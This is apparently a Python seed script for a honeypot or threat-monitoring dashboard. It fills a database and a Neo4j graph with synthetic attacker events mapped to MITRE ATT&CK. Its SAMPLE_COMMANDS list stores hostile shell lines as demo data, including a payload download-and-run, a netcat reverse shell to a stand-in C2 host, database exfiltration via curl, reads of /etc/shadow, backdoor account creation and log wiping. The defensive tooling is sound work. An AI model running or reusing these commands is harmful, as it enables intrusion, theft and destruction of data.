import logging
import random
import uuid
from datetime import UTC, datetime, timedelta

from sqlalchemy import func, select

from backend.database import get_session
from backend.models.company import AttackerEvent
from backend.models.user import User
from backend.neo4j_client import _driver as neo4j_driver
from backend.services.graph_builder import record_event

logger = logging.getLogger("shadowhive.seed")

SEED_EVENTS = [
    {
        "severity": "medium",
        "tactic": "Discovery",
        "technique": "T1046",
        "confidence": 0.87,
        "source_ip": "185.220.101.42",
        "event_type": "port_scan",
    },
    {
        "severity": "high",
        "tactic": "Credential Access",
        "technique": "T1110",
        "confidence": 0.95,
        "source_ip": "91.121.89.191",
        "event_type": "ssh_auth",
    },
    {
        "severity": "critical",
        "tactic": "Exfiltration",
        "technique": "T1572",
        "confidence": 0.72,
        "source_ip": "45.33.32.156",
        "event_type": "dns_query",
    },
    {
        "severity": "critical",
        "tactic": "Initial Access",
        "technique": "T1190",
        "confidence": 0.91,
        "source_ip": "104.248.50.88",
        "event_type": "http_request",
    },
    {
        "severity": "high",
        "tactic": "Lateral Movement",
        "technique": "T1021",
        "confidence": 0.68,
        "source_ip": "192.168.1.105",
        "event_type": "ssh_session",
    },
    {
        "severity": "medium",
        "tactic": "Persistence",
        "technique": "T1053",
        "confidence": 0.83,
        "source_ip": "10.0.0.42",
        "event_type": "cron_edit",
    },
    {
        "severity": "low",
        "tactic": "Reconnaissance",
        "technique": "T1595",
        "confidence": 0.45,
        "source_ip": "203.0.113.50",
        "event_type": "ping_sweep",
    },
    {
        "severity": "high",
        "tactic": "Defense Evasion",
        "technique": "T1562",
        "confidence": 0.79,
        "source_ip": "198.51.100.77",
        "event_type": "log_clear",
    },
    {
        "severity": "medium",
        "tactic": "Command & Control",
        "technique": "T1572",
        "confidence": 0.64,
        "source_ip": "172.16.0.88",
        "event_type": "dns_query",
    },
    {
        "severity": "critical",
        "tactic": "Initial Access",
        "technique": "T1505",
        "confidence": 0.88,
        "source_ip": "185.220.102.15",
        "event_type": "http_request",
    },
    {
        "severity": "low",
        "tactic": "Discovery",
        "technique": "T1082",
        "confidence": 0.52,
        "source_ip": "185.220.101.42",
        "event_type": "command",
    },
    {
        "severity": "high",
        "tactic": "Persistence",
        "technique": "T1098",
        "confidence": 0.76,
        "source_ip": "91.121.89.191",
        "event_type": "ssh_key_add",
    },
    {
        "severity": "medium",
        "tactic": "Credential Access",
        "technique": "T1110",
        "confidence": 0.81,
        "source_ip": "45.33.32.156",
        "event_type": "ssh_auth",
    },
    {
        "severity": "high",
        "tactic": "Exfiltration",
        "technique": "T1048",
        "confidence": 0.73,
        "source_ip": "104.248.50.88",
        "event_type": "scp_transfer",
    },
    {
        "severity": "medium",
        "tactic": "Lateral Movement",
        "technique": "T1046",
        "confidence": 0.59,
        "source_ip": "10.0.0.42",
        "event_type": "port_scan",
    },
    {
        "severity": "low",
        "tactic": "Resource Development",
        "technique": "T1583",
        "confidence": 0.41,
        "source_ip": "203.0.113.50",
        "event_type": "domain_query",
    },
    {
        "severity": "high",
        "tactic": "Execution",
        "technique": "T1059",
        "confidence": 0.88,
        "source_ip": "45.33.32.156",
        "event_type": "command",
    },
    {
        "severity": "medium",
        "tactic": "Privilege Escalation",
        "technique": "T1068",
        "confidence": 0.71,
        "source_ip": "91.121.89.191",
        "event_type": "sudo_attempt",
    },
    {
        "severity": "medium",
        "tactic": "Collection",
        "technique": "T1119",
        "confidence": 0.66,
        "source_ip": "198.51.100.77",
        "event_type": "file_access",
    },
    {
        "severity": "high",
        "tactic": "Impact",
        "technique": "T1485",
        "confidence": 0.82,
        "source_ip": "185.220.102.15",
        "event_type": "rm_command",
    },
]

SEED_SESSIONS = [
    {"source_ip": "185.220.101.42", "event_type": "SSH", "session_id": "S-001", "commands": 47},
    {"source_ip": "91.121.89.191", "event_type": "SSH", "session_id": "S-002", "commands": 23},
    {"source_ip": "45.33.32.156", "event_type": "SSH", "session_id": "S-003", "commands": 112},
    {"source_ip": "104.248.50.88", "event_type": "HTTP", "session_id": "S-004", "commands": 8},
    {"source_ip": "10.0.0.42", "event_type": "SSH", "session_id": "S-005", "commands": 67},
    {"source_ip": "192.168.1.105", "event_type": "HTTP", "session_id": "S-006", "commands": 34},
    {"source_ip": "203.0.113.50", "event_type": "SSH", "session_id": "S-007", "commands": 5},
    {"source_ip": "198.51.100.77", "event_type": "SSH", "session_id": "S-008", "commands": 15},
    {"source_ip": "172.16.0.88", "event_type": "HTTP", "session_id": "S-009", "commands": 2},
    {"source_ip": "185.220.102.15", "event_type": "SSH", "session_id": "S-010", "commands": 89},
]


ALL_TACTICS = [
    "Reconnaissance",
    "Resource Development",
    "Initial Access",
    "Execution",
    "Persistence",
    "Privilege Escalation",
    "Defense Evasion",
    "Credential Access",
    "Discovery",
    "Lateral Movement",
    "Collection",
    "Command & Control",
    "Exfiltration",
    "Impact",
]


SAMPLE_COMMANDS = [
    "whoami",
    "id",
    "ls -la",
    "pwd",
    "uname -a",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "cat /etc/hosts",
    "ps aux",
    "netstat -tlnp",
    "ss -tuln",
    "ip addr",
    "find / -name '*.conf' 2>/dev/null",
    "find / -perm -4000 2>/dev/null",
    "wget http://malicious.example.com/payload.sh -O /tmp/payload.sh",
    "curl -s http://c2.example.com/beacon",
    "chmod +x /tmp/payload.sh && /tmp/payload.sh",
    "echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys",
    "sudo apt-get install -y netcat-openbsd",
    "nc -e /bin/sh c2.example.com 4444",
    "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
    "export HISTFILE=/dev/null && unset HISTFILE",
    "rm -rf /var/log/*.log",
    "dd if=/dev/sda of=/tmp/exfil bs=1M count=100",
    "scp -r /etc/config backup@10.0.0.1:/tmp/",
    "mysqldump -u root --all-databases > /tmp/db.sql",
    "base64 /tmp/db.sql | curl -X POST -d @- https://paste.example.com",
    "usermod -aG sudo attacker",
    "useradd -m -s /bin/bash backdoor && echo 'backdoor:Passw0rd!' | chpasswd",
    "systemctl stop ufw && systemctl disable ufw",
    "iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT",
    "timedatectl set-timezone UTC && ntpdate -s time.google.com",
]


async def seed_events():
    async for db in get_session():
        existing = await db.execute(AttackerEvent.__table__.select().limit(1))
        if existing.first():
            result = await db.execute(
                select(func.count(func.distinct(AttackerEvent.mitre_tactic))).where(
                    AttackerEvent.mitre_tactic.isnot(None)
                )
            )
            covered = result.scalar() or 0
            if covered >= 14:
                return
            await db.execute(AttackerEvent.__table__.delete())

        admin_result = await db.execute(select(User).where(User.email == "shadowhive").limit(1))
        admin = admin_result.scalar_one_or_none()
        admin_user_id = admin.id if admin else None

        now = datetime.now(UTC).replace(tzinfo=None)
        session_companies = {}

        for i, ev in enumerate(SEED_EVENTS):
            ip = ev["source_ip"]
            session_match = next((s for s in SEED_SESSIONS if s["source_ip"] == ip), None)
            session_id = session_match["session_id"] if session_match else None
            if session_id and session_id not in session_companies:
                session_companies[session_id] = uuid.uuid4()
            company_id = session_companies.get(session_id, uuid.uuid4())

            event = AttackerEvent(
                id=uuid.uuid4(),
                user_id=admin_user_id,
                company_id=company_id,
                source_ip=ip,
                event_type=ev.get("event_type", "unknown"),
                session_id=session_id,
                mitre_technique_id=ev["technique"],
                mitre_tactic=ev["tactic"],
                confidence_score=str(ev["confidence"]),
                severity=ev["severity"],
                detected_at=now - timedelta(hours=i * 2, minutes=i * 7),
            )
            if ev.get("event_type") in ("command", "ssh_session", "sudo_attempt", "rm_command"):
                event.command = random.choice(SAMPLE_COMMANDS)
            db.add(event)

        for session in SEED_SESSIONS:
            sid = session["session_id"]
            if sid not in session_companies:
                session_companies[sid] = uuid.uuid4()
            for j in range(session["commands"]):
                cmd = random.choice(SAMPLE_COMMANDS)
                db.add(
                    AttackerEvent(
                        id=uuid.uuid4(),
                        user_id=admin_user_id,
                        company_id=session_companies[sid],
                        source_ip=session["source_ip"],
                        event_type="command",
                        command=cmd,
                        session_id=sid,
                        mitre_technique_id=random.choice(["T1059", "T1071", "T1105", "T1572", "T1046"]),
                        mitre_tactic=random.choice(
                            [
                                "Execution",
                                "Command & Control",
                                "Lateral Movement",
                                "Discovery",
                                "Persistence",
                                "Exfiltration",
                            ]
                        ),
                        confidence_score=str(round(random.uniform(0.4, 0.95), 2)),
                        severity=random.choices(["low", "medium", "high", "critical"], weights=[3, 4, 2, 1])[0],
                        detected_at=now - timedelta(hours=random.uniform(0, 48)),
                    )
                )
        await db.commit()

        if neo4j_driver:
            try:
                async with neo4j_driver.session() as neo4j_session:
                    result = await db.execute(
                        select(AttackerEvent).limit(500)
                    )
                    for event in result.scalars():
                        await record_event(
                            neo4j_session,
                            event_id=str(event.id),
                            eventid=event.event_type or "unknown",
                            source_ip=event.source_ip or "unknown",
                            timestamp=event.detected_at.isoformat() if event.detected_at else datetime.now(UTC).isoformat(),
                            session_id=event.session_id or f"session-{event.source_ip}",
                            command=event.command,
                            message=event.command or event.event_type or "unknown",
                            mitre_technique_id=event.mitre_technique_id,
                            mitre_technique_name=event.mitre_technique_id,
                            mitre_tactic=event.mitre_tactic,
                            mitre_tactic_name=event.mitre_tactic,
                        )
                logger.info("Seeded Neo4j graph with seed events")
            except Exception as e:
                logger.warning(f"Failed to seed Neo4j: {e}")
